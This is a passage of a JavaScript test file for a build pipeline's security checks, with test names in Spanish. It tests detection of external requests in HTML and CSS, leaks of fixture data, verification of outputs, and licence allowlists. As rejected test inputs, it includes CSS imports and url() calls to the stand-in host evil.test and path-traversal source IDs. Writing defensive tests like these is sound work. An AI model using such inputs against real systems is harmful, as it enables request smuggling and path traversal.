    assert.throws(() => assertNoAutomaticExternalRequests(html), /externos/, html)
  }
  for (const html of [
    '<meta http-equiv="refresh" content="0">',
    '<meta http-equiv="refresh" content="30">',
    '<meta http-equiv="refresh" content="0 /local/page">',
    '<meta http-equiv="refresh" content="0;url=/local/page">',
    '<meta http-equiv="refresh" content="0 url=http://localhost:8000/page">',
    // `u` sin `rl=`: WHATWG vuelve al paso «parse» con la u incluida, o sea relativo.
    '<meta http-equiv="refresh" content="0 uhttps//evil.test/page">',
    '<meta http-equiv="refresh" content="no-es-refresh">',
  ]) {
    assert.doesNotThrow(() => assertNoAutomaticExternalRequests(html), html)
  }
})

test("LightningCSS distingue recursos pasivos de imports ejecutables", () => {
  withTempDirectory((directory) => {
    const css = path.join(directory, "app.css")
    for (const source of [
      'a{background:url("data:image/svg+xml,%3Csvg/%3E")}',
      'a{background:url("./local.png")}',
    ]) {
      writeFileSync(css, source)
      assert.doesNotThrow(() => assertNoExternalRequestsInOutputs([css]))
    }
    for (const source of [
      '@import "data:text/css,a{}";',
      '@import "https://evil.test/x.css";',
      'a{background:url("https://evil.test/x.png")}',
      'a{background:url("blob:https://evil.test/id")}',
      'a{background:url(h\\74 tps://evil.test/x.png)}',
      "@import ;",
    ]) {
      writeFileSync(css, source)
      assert.throws(() => assertNoExternalRequestsInOutputs([css]))
    }
  })
})

test("manifest estructurado enumera fixtures anidados y exige ventana central", () => {
  withTempDirectory((directory) => {
    mkdirSync(path.join(directory, "nested"))
    const bytes = Buffer.from("0123456789abcdefghijklmnopqrstuvwxyz")
    writeFileSync(path.join(directory, "nested", "fixture.bin"), bytes)
    const manifest = {
      schema_version: 2,
      sentinel: "NIKODYM_DEMO_FIXTURE_ONLY",
      files: { "nested/fixture.bin": signature(bytes) },
    }
    assert.doesNotThrow(() => validateFixtureManifest(manifest, directory))
    manifest.files["nested/fixture.bin"].windows = [
      {
        offset: 0,
        length: Math.floor(bytes.length / 2),
        base64: bytes.subarray(0, Math.floor(bytes.length / 2)).toString("base64"),
      },
    ]
    assert.throws(() => validateFixtureManifest(manifest, directory), /canónicas/)
    delete manifest.files["nested/fixture.bin"]
    assert.throws(() => validateFixtureManifest(manifest, directory), /incompleto/)
  })
})

test("scanner detecta JSON inline, centro binario, base64 y sentinel", () => {
  withTempDirectory((directory) => {
    const json = Buffer.from('{\n  "cliente": "DEMO-123",\n  "valor": 42\n}\n')
    const binary = Buffer.from(Array.from({ length: 128 }, (_, index) => index))
    writeFileSync(path.join(directory, "fixture.json"), json)
    writeFileSync(path.join(directory, "fixture.bin"), binary)
    const manifest = {
      schema_version: 2,
      sentinel: "NIKODYM_DEMO_FIXTURE_ONLY",
      files: {
        "fixture.json": signature(json),
        "fixture.bin": signature(binary),
      },
    }
    const cases = [
      Buffer.from(`const payload=${JSON.stringify(JSON.parse(json.toString("utf8")))}`),
      binary.subarray(
        signature(binary).windows[1].offset,
        signature(binary).windows[1].offset + signature(binary).windows[1].length,
      ),
      Buffer.from(signature(binary).windows[1].base64),
      Buffer.from("prefix-NIKODYM_DEMO_FIXTURE_ONLY-suffix"),
    ]
    cases.forEach((content, index) => {
      const output = path.join(directory, `output-${index}.js`)
      writeFileSync(output, content)
      assert.throws(() => assertNoFixtureMaterial([output], manifest, directory))
    })
  })
})

test("manifiesto final rechaza bytes cambiados, extras y duplicados declarados", () => {
  withTempDirectory((directory) => {
    const output = path.join(directory, "index.html")
    writeFileSync(output, "ok")
    const valid = {
      schema_version: 2,
      outputs: [{
        path: "index.html",
        size: 2,
        sha256: sha256(Buffer.from("ok")),
        direct_source_ids: ["web/index.html"],
      }],
    }
    assert.doesNotThrow(() => verifyFinalOutputs([output], valid, directory))
    assert.throws(
      () => verifyFinalOutputs([output], { ...valid, outputs: [...valid.outputs, valid.outputs[0]] }, directory),
      /duplicado|exactamente/,
    )
    writeFileSync(path.join(directory, "extra.js"), "x")
    assert.throws(
      () => verifyFinalOutputs([output, path.join(directory, "extra.js")], valid, directory),
      /exactamente/,
    )
    for (const direct_source_ids of [
      undefined,
      [],
      ["web\\index.html"],
      ["web/index.html", "web/index.html"],
      ["z/source", "a/source"],
      ["web/%2e%2e/secret.ts"],
      ["web/%252e%252e/secret.ts"],
      ["web/\0secret.ts"],
    ]) {
      assert.throws(() =>
        verifyFinalOutputs(
          [output],
          {
            ...valid,
            outputs: [{ ...valid.outputs[0], direct_source_ids }],
          },
          directory,
        ),
      )
    }
  })
})

test("normaliza de forma estricta el JSON agrupado de pnpm 11", () => {
  const result = normalizePnpmLicenses({
    MIT: [{ name: "react", versions: ["19.2.0"], paths: ["/x"] }],
  })
  assert.deepEqual(result, [{ name: "react", version: "19.2.0", license: "MIT" }])
  for (const raw of [
    { error: { code: "ERR_PNPM_MISSING_PACKAGE_INDEX_FILE" } },
    { MIT: { name: "react" } },
    { MIT: [{ name: "react", versions: ["1", "2"], paths: ["/x"] }] },
    { MIT: [{ name: "", versions: ["1"], paths: ["/x"] }] },
  ]) {
    assert.throws(() => normalizePnpmLicenses(raw), /Inventario pnpm/)
  }
})

test("reconciliación exige prod subconjunto y conjunto permisivo cerrado", () => {
  const args = {
    full: [{ name: "ok", version: "1", license: "BlueOak-1.0.0" }],
    prod: [{ name: "ok", version: "1", license: "BlueOak-1.0.0" }],
    provenance: {
      packages: [{ name: "ok", version: "1", license: "BlueOak-1.0.0" }],
    },
    allowlist: { schema_version: 1, entries: [] },
    lockText: "ok@1:",
  }
  assert.doesNotThrow(() => reconcile(args))
  assert.throws(
    () => reconcile({
      ...args,
      prod: [{ name: "missing", version: "1", license: "MIT" }],
    }),
    /subconjunto/,
  )
  assert.throws(
    () => reconcile({
      ...args,
      full: [{ name: "ok", version: "1", license: "Artistic-2.0" }],
      prod: [],
      provenance: { packages: [] },
    }),
    /conjunto cerrado/,
  )
})

test("rechaza expresiones ambiguas o propietarias", () => {
  for (const license of [
    "SEE LICENSE IN LICENSE.txt",
    "NOASSERTION",
    "LicenseRef-Commercial",
    "Proprietary",
  ]) {
    assert.throws(
      () => reconcile({
        full: [{ name: "ambiguous", version: "1", license }],
        prod: [],
        provenance: { packages: [] },
        allowlist: { schema_version: 1, entries: [] },
        lockText: "ambiguous@1:",
      }),
      /conjunto cerrado/,
    )
  }
})

test("GPL falla incluso si se intenta introducir por allowlist", () => {
  const entry = {
    name: "evil",
    version: "1",
    license: "GPL-3.0",
    scope: "build-only",
    rationale: "no debe pasar",
  }
  assert.throws(() => reconcile({
    full: [{ name: entry.name, version: entry.version, license: entry.license }],
    prod: [],
    provenance: { packages: [] },
    allowlist: { schema_version: 1, entries: [entry] },
    lockText: "evil@1:",
  }))
})

test("MPL build-only pasa solo fuera de prod y procedencia", () => {
  const entry = {
    name: "lightningcss",
    version: "1.32.0",
    license: "MPL-2.0",
    scope: "build-only",
    rationale: "build",
  }
  const args = {
    full: [{ name: entry.name, version: entry.version, license: entry.license }],
    prod: [],
    provenance: { packages: [] },
    allowlist: { schema_version: 1, entries: [entry] },
    lockText: "lightningcss@1.32.0:",
  }
  assert.doesNotThrow(() => reconcile(args))
  assert.throws(() => reconcile({ ...args, prod: args.full }), /prod/)
  assert.throws(
    () => reconcile({ ...args, provenance: { packages: [entry] } }),
    /procedencia/,
  )
})
